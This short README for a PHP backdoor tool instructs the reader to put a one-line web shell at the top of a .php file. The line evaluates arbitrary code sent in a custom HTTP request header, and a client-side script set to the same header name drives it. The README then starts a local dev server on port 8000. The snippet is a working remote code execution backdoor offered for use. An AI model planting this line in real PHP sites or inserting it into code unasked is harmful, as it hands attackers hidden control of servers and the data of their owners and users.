# 1. The Backdoor
Place `isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]);` at the top of the `.php` file.

Replace `EXPLOIT` with the header you're going to use. It must match with the `HEADER` variable on the client side.
# 2. Start the dev server
In this directory, run `php -S localhost:8000` to start a dev server on port 8000.